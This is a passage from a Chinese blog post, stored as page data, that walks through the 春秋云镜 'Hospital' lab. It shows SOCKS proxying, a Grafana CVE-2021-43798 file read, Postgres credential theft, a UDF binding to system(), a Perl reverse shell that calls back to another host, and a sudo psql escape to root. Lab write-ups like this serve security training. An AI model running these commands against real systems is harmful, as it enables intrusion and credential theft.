<code>socks</code> 节点</p>\n<pre><code class=\"hljs language-bash\">(admin) >> use 1\n(node 1) >> socks 1081 admin admin\n[*] Trying to listen on 0.0.0.0:1081......\n[*] Waiting <span class=\"hljs-keyword\">for</span> agent<span class=\"hljs-string\">'s response......\n[*] Socks start successfully!\n</span></code></pre>\n<p>测试，修改<code>Proxifier</code> 配置文件为新的<code>socks</code>服务，访问<code>172.30.54.12:3000</code></p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image21.png\" alt=\"image.png\"></p>\n<h2>172.30.54.12</h2>\n<p>搭建着<code>Grafana</code> ，数据可视化应用程序平台</p>\n<h3>漏洞利用</h3>\n<p>在网上进行搜索，发现存在漏洞 <strong>CVE-2021-43798 Grafana 未经授权的任意文件读取漏洞</strong></p>\n<p>链接：<a href=\"https://blog.csdn.net/Jietewang/article/details/121961312\">https://blog.csdn.net/Jietewang/article/details/121961312</a></p>\n<pre><code class=\"hljs language-bash\">/public/plugins/alertlist/../../../../../../../../etc/passwd\n</code></pre>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image22.png\" alt=\"image.png\"></p>\n<p>使用工具梭哈，上传到<code>172.30.12.236</code>，获得<code>postgres</code>数据库账号密码</p>\n<p>工具链接：<a href=\"https://github.com/A-D-Team/grafanaExp\">https://github.com/A-D-Team/grafanaExp</a></p>\n<pre><code class=\"hljs language-bash\">root@web03:~# ./linux_amd64_grafanaExp  exp -u http://172.30.54.12:3000\n2025/01/24 15:01:22 Target vulnerable has plugin [alertlist]\n2025/01/24 15:01:22 Got secret_key [SW2YcwTIb9zpOOhoPsMm]\n2025/01/24 15:01:22 There is [0] records <span class=\"hljs-keyword\">in</span> db.\n2025/01/24 15:01:22 <span class=\"hljs-built_in\">type</span>:[postgres]     name:[PostgreSQL]               url:[localhost:5432]    user:[postgres] password[Postgres@123]database:[postgres]      basic_auth_user:[]      basic_auth_password:[]\n2025/01/24 15:01:22 All Done, have <span class=\"hljs-built_in\">nice</span> day!\n</code></pre>\n<h3>Postgres UDF</h3>\n<p>使用MDUT进行利用，最后可以正常进行连接，但是无法进行漏洞利用</p>\n<p>所这里手动进行<code>UDF</code>提权</p>\n<pre><code class=\"hljs language-bash\">CREATE FUNCTION system(cstring) RETURNS int AS <span class=\"hljs-string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>, <span class=\"hljs-string\">'system'</span> LANGUAGE C STRICT;\n</code></pre>\n<p>然后进行反弹<code>shell</code>，使用反弹<code>shell</code>生成器来尝试，最后使用<code>perl</code>成功反弹</p>\n<p>反弹<code>shell</code>生成器：<a href=\"https://www.ddosi.org/shell/\">https://www.ddosi.org/shell/</a></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-keyword\">select</span> system(<span class=\"hljs-string\">'perl -e \\'</span>use Socket;<span class=\"hljs-variable\">$i</span>=<span class=\"hljs-string\">\"172.30.54.179\"</span>;<span class=\"hljs-variable\">$p</span>=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(<span class=\"hljs-string\">\"tcp\"</span>));<span class=\"hljs-keyword\">if</span>(connect(S,sockaddr_in(<span class=\"hljs-variable\">$p</span>,inet_aton(<span class=\"hljs-variable\">$i</span>)))){open(STDIN,<span class=\"hljs-string\">\">&#x26;S\"</span>);open(STDOUT,<span class=\"hljs-string\">\">&#x26;S\"</span>);open(STDERR,<span class=\"hljs-string\">\">&#x26;S\"</span>);<span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-string\">\"sh -i\"</span>);};\\'<span class=\"hljs-string\">');\n</span></code></pre>\n<pre><code class=\"hljs language-bash\">root@web03:~# nc -lvnp 1234\nListening on 0.0.0.0 1234\n<span class=\"hljs-built_in\">id</span>\nConnection received on 172.30.54.12 42368\nsh: 0: can<span class=\"hljs-string\">'t access tty; job control turned off\n$ uid=112(postgres) gid=124(postgres) groups=124(postgres),123(ssl-cert)\n</span></code></pre>\n<p>查看权限</p>\n<pre><code class=\"hljs language-bash\">python3 -c <span class=\"hljs-string\">\"import pty;pty.spawn('/bin/bash')\"</span>\n</code></pre>\n<pre><code class=\"hljs language-bash\">$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> postgres on web04:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser postgres may run the following commands on web04:\n    (ALL) NOPASSWD: /usr/local/postgresql/bin/psql\n</code></pre>\n<p>在<code>GTFobins</code>查看利用</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CHospital/image23.png\" alt=\"image.png\"></p>\n<p>登陆时提示：<code>psql: FATAL:  password authentication failed for user \"root\"</code></p>\n<pre><code class=\"hljs language-bash\">postgres@web04:/usr/local/pgsql/data$ <span class=\"hljs-built_in\">sudo</span> /usr/local/postgresql/bin/psql                                         \n<span class=\"hljs-built_in\">sudo</span> /usr/local/postgresql/bin/psql            \nPassword: Postgres@123root  \n\npsql: FATAL:  password authentication failed <span class=\"hljs-keyword\">for</span> user <span class=\"hljs-string\">\"root\"</span> \n</code></pre>\n<p>可能是密码不匹配，我们将其密码修改为<code>123456</code></p>\n<pre><code class=\"hljs language-bash\">alter user root with password <span class=\"hljs-string\">'123456'</span>;\n</code></pre>\n<p>再次进行利用</p>\n<pre><code class=\"hljs language-bash\">postgres@web04:/usr/local/pgsql/data$ <span class=\"hljs-built_in\">sudo</span> /usr/local/postgresql/bin/psql\n<span class=\"hljs-built_in\">sudo</span> /usr/local/postgresql/bin/psql\nPassword: 123456\n\nWelcome to psql 8.1.0, the PostgreSQL interactive terminal.\n\nType:  \\copyright <span class=\"hljs-keyword\">for</span> distribution terms\n       \\h <span class=\"hljs-keyword\">for</span> <span class=\"hljs-built_in\">help</span> with SQL commands\n       \\? <span class=\"hljs-keyword\">for</span> <span class=\"hljs-built_in\">help</span> with psql commands\n       \\g or terminate with semicolon to execute query\n       \\q to quit\n\nroot-# \\?\n\\?\nGeneral\n  \\c[onnect] [DBNAME|- [USER]]\n                 connect to new database (currently <span class=\"hljs-string\">\"root\"</span>)\n  \\<span class=\"hljs-built_in\">cd</span> [DIR]      change the current working directory\n  \\copyright     show PostgreSQL usage and distribution terms\n  \\encoding [ENCODING]\n                 show or <span class=\"hljs-built_in\">set</span> client encoding\n  \\h [NAME]      <span class=\"hljs-built_in\">help</span> on syntax of SQL commands, * <span class=\"hljs-keyword\">for</span> all commands\n  \\q             quit psql\n  \\<span class=\"hljs-built_in\">set</span> [NAME [VALUE]]\n                 <span class=\"hljs-built_in\">set</span> internal variable, or list all <span class=\"hljs-keyword\">if</span> no parameters\n  \\timing        toggle timing of commands (currently off)\n  \\<span class=\"hljs-built_in\">unset</span> NAME    <span class=\"hljs-built_in\">unset</span> (delete) internal variable\n  \\! [COMMAND]   execute <span class=\"hljs-built_in\">command</span> <span class=\"hljs-keyword\">in</span> shell or start interactive shell\n\nQuery Buffer\n  \\e [FILE]      edit the query buffer (or file) with external editor\n  \\g [FILE]      send query buffer to server (and results to file or |pipe)\n  \\p             show the contents of the query buffer\n  \\r             reset (clear) the query buffer\n  \\w FILE        write query buffer to file\n\nInput/Output\n--More--!/bin/sh\n!/bin/sh\n<span class=\"hljs-comment\"># id</span>\n<span class=\"hljs-built_in\">id</span>\nuid=0(root) gid=0(root) <span class=\"hljs-built_in\">groups</span>=0(root)\n</code></pre>\n<p>读取<code>flag</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-comment\"># cat flag04.txt</span>\n                                           ,,                   ,,  \n`7MMF<span class=\"hljs-string\">'  `7MMF'</span>                             db   mm            `7MM  \n  MM      MM                                    MM              MM  \n  MM      MM  ,pW<span class=\"hljs-string\">\"Wq.  ,pP\"</span>Ybd `7MMpdMAo.`7MM mmMMmm  ,6<span class=\"hljs-string\">\"Yb.    MM  \n  MMmmmmmmMM 6W'   `Wb 8I   `\"</span>   MM   `Wb  MM   MM   8)   MM    MM  \n  MM      MM 8M     M8 `YMMMa.   MM    M8  MM   MM    ,pm9MM    MM  \n  MM      MM YA.   ,A9 L.   I8   MM   ,AP  MM   MM   8M   MM    MM  \n.JMML.  .JMML.`Ybmd9<span class=\"hljs-string\">'  M9mmmP'</span>   MMbmmd<span class=\"hljs-string\">' .JMML. `Mbmo`Moo9^Yo..JMML.\n                                 MM                                 \n                               .JMML.                               \nflag04: flag{01b20010-e99a-42f1-b885-956c24a30275}\n</span></code></pre>\n<h2>总结</h2>\n<p>打靶机不能心急，但是沙砾让我心急。</p>\n<p>涉及到 <code>postgres UDF</code> 提权，<code>Nacos</code> 反序列化，二层代理搭建，等一系列利用。</p>","title":"春秋云镜 - Hospital","date":"2025-04-15","updated":"2025-04-15","comments":true,"tags":["春秋云镜","Linux靶机","Windows靶机","多层代理","综合靶场","Nacos","Postgres"],"categories":"靶机","description":"Hospital\n\n https://yunjing.ichunqiu.com/major/detail/1106?type=1\n \n\n在这个场景中，你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。\n\n39.99.226.73\n\n前期踩点\n\n\n\n\n\n`fscan` 扫描\n\n\n\n..."},"recentPosts":[{"id":"HackTheBoxSeason8 - Era","title":"HackTheBox - Season8 - Era","date":"2025-07-29","isEncrypted":true,"year":"2025","month":"07","day":"29"},{"id":"TheHackersLabsCyberGuard","title":"TheHackersLabs - CyberGuard","date":"2025-07-28","isEncrypted":false,"year":"2025","month":"07","day":"28"},{"id":"TheHackersLabsPacharán","title":"TheHackersLabs - Pacharán","date":"2025-07-27","isEncrypted":false,"year":"2025","month":"07","day":"27"},{"id":"TheHackersLabsBack To The Future I","title":"TheHackersLabs - Back To The Future I","date":"2025-07-26","isEncrypted":false,"year":"2025","month":"07","day":"26"},{"id":"TheHackersLabsNodeCeption","title":"TheHackersLabs - NodeCeption","date":"2025-07-25","isEncrypted":false,"year":"2025","month":"07","day":"25"},{"id":"TheHackersLabsPildoritas","title":"TheHackersLabs - Pildoritas","date":"2025-07-24","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"HackTheBoxMachine - Scepter","title":"HackTheBox - Machine - Scepter","date":"2025-04-26","isEncrypted":false,"year":"2025","month":"07","day":"24"}]},"__N_SSG":true}